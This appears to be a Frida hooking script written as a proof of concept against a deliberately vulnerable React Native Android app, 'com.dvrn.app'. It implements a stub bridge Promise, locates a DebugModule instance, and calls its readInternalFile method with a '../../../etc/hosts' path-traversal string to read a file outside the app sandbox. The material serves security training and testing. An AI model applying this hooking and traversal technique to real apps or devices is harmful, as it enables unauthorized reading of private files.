Java.perform(function () {
  const Promise = Java.use("com.facebook.react.bridge.Promise");

  const MyPromise = Java.registerClass({
    name: "com.dvrn.app.MyFridaPromise",
    implements: [Promise],
    methods: {
      resolve: function (value) {
        console.log("[VB04] resolve: " + value);
      },
      reject: [
        {
          returnType: "void",
          argumentTypes: ["java.lang.String"],
          implementation: function (code) {
            console.log("[VB04] reject(code): " + code);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.String", "com.facebook.react.bridge.WritableMap"],
          implementation: function (code, userInfo) {
            console.log("[VB04] reject(code, userInfo): " + code);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.String", "java.lang.String"],
          implementation: function (code, message) {
            console.log("[VB04] reject(code, message): " + code + " / " + message);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.String", "java.lang.String", "com.facebook.react.bridge.WritableMap"],
          implementation: function (code, message, userInfo) {
            console.log("[VB04] reject(code, message, userInfo): " + code + " / " + message);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.String", "java.lang.String", "java.lang.Throwable"],
          implementation: function (code, message, throwable) {
            console.log("[VB04] reject(code, message, throwable): " + code + " / " + message + " / " + throwable);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.String", "java.lang.String", "java.lang.Throwable", "com.facebook.react.bridge.WritableMap"],
          implementation: function (code, message, throwable, userInfo) {
            console.log("[VB04] reject(code, message, throwable, userInfo): " + code + " / " + message + " / " + throwable);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.String", "java.lang.Throwable", "com.facebook.react.bridge.WritableMap"],
          implementation: function (code, throwable, userInfo) {
            console.log("[VB04] reject(code, throwable, userInfo): " + code + " / " + throwable);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.String", "java.lang.Throwable"],
          implementation: function (code, throwable) {
            console.log("[VB04] reject(code, throwable): " + code + " / " + throwable);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.Throwable", "com.facebook.react.bridge.WritableMap"],
          implementation: function (throwable, userInfo) {
            console.log("[VB04] reject(throwable, userInfo): " + throwable);
          },
        },
        {
          returnType: "void",
          argumentTypes: ["java.lang.Throwable"],
          implementation: function (throwable) {
            console.log("[VB04] reject(throwable): " + throwable);
          },
        },
      ],
    },
  });

  Java.choose("com.dvrn.app.DebugModule", {
    onMatch: function (instance) {
      console.log("[VB04] Found DebugModule instance, calling readInternalFile...");
      const p1 = MyPromise.$new();
      instance.readInternalFile("/data/data/com.dvrn.app/files/dvrn_debug_info.txt", p1);

      const p2 = MyPromise.$new();
      instance.readInternalFile("/data/data/com.dvrn.app/../../../etc/hosts", p2);
    },
    onComplete: function () {
      console.log("[VB04] done searching");
    },
  });
});